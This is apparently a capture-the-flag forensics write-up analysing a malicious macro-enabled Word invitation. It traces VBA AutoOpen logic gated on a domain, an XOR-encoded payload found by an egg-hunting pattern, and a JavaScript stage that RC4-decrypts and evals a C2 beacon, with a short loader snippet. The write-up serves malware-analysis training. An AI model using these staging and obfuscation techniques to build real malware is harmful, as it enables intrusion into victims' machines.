# Synopsis

A hard forensics challenge that involves "egg hunting" an encrypted embedded payload on a malicious document, and deobfuscating two layers of malicious javascript to uncover a javascript-based Command & Control beacon.

## Description

* In the bustling city of KORPâ„¢, where factions vie in The Fray, a mysterious game emerges. As a seasoned faction member, you feel the tension growing by the minute. Whispers spread of a new challenge, piquing both curiosity and wariness. Then, an email arrives: "Join The Fray: Embrace the Challenge." But lurking beneath the excitement is a nagging doubt. Could this invitation hide something more sinister within its innocent attachment?

## Skills Required

* VBA macros knowledge
* Javascript knowledge
* Basic encryption algorithm recognition

## Skills Learned

* VBA macros extraction
* VBA macros deobfuscation
* Javascript deobfuscation
* Carving out egg-hunting payloads

# Enumeration

We are given a file named `invitation.docm`. Before even analyzing we know that it probably contains macros due to its extension `.docm`. The `m` indicates that this file has embedded macros.

As always using `olevba` we can extract and analyze the macros.

Let us analyze the code.

* This function, `JFqcfEGnc`, takes in an array of bytes `given_string()` and its length. It performs an XOR encryption on each byte of the given_string() using a dynamic XOR key and returns True after the encryption is complete.
* The subroutine `AutoClose` seems to be a cleanup routine that attempts to delete a specific file (IAiiymixt) and all files in a specified directory (kWXlyKwVj) when the document or workbook is closed. Additionally, it employs error handling to ensure that any errors encountered during execution do not disrupt the closure of the document or workbook.
* The `AutoOpen` subroutine contains the main logic of the malware. It checks if the user's domain matches a predefined domain `GAMEMASTERS.local`. If the user's domain doesn't match, the subroutine exits without performing any further actions. If the user's domain matches, it proceeds to read the contents of the active document into memory. It determines the length of the file and reads its contents into a byte array `CbkQJVeAG`. It then uses a regular expression pattern to search for a specific string within the contents of the document `SwMbxtWpP`. The regular expression pattern is `sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa`. If the pattern is not found, the code jumps to the error handler label `MnOWqnnpKXfRO`. If the pattern is found, it calculates an offset `Y5t4Ul7o385qK4YDhr` and reads a portion of the file into another byte array `Wk4o3X7x1134j`. * Finally, it executes the file `IAiiymixt` with a parameter `vF8rdgMHKBrvCoCp0ulm` using the Run method of `WScript.Shell`.

So we need to parse the document and locate the pattern. Then we will extract the following `13082` which is the encoded payload. After decoding with the same custom XOR algorithm, we will see the next step of the attack. To do so, we will use a custom Python script.

The output can be seen below.

To make our task easier, we will beautify the code.

An experienced player here might recognize the usage of the following functions. But, using Chat-GPT, anyone can understand them.

* The `JrvS` function is used to `base64` decode a given string.
* `xR68` is RC4 decryption using the provided key along with the provided encrypted string. The key for this task is passed as a command argument during the execution of the `js` file.

```js
var lVky = WScript.Arguments;
var DASz = lVky(0);
...
Iwlh = xR68(DASz, Iwlh);
eval(Iwlh);
```

# Solution 
Taking everything into account, we can now decrypt the encrypted string. Using cyberchef, we get the following result.

By beautifying the code, we can see that the next stage is a fully functional JavaScript-based C2 beacon.

There is a function that is used to communicate with the server sending HTTP requests. We can find the flag in a cookie header as a means of beacon authentication.
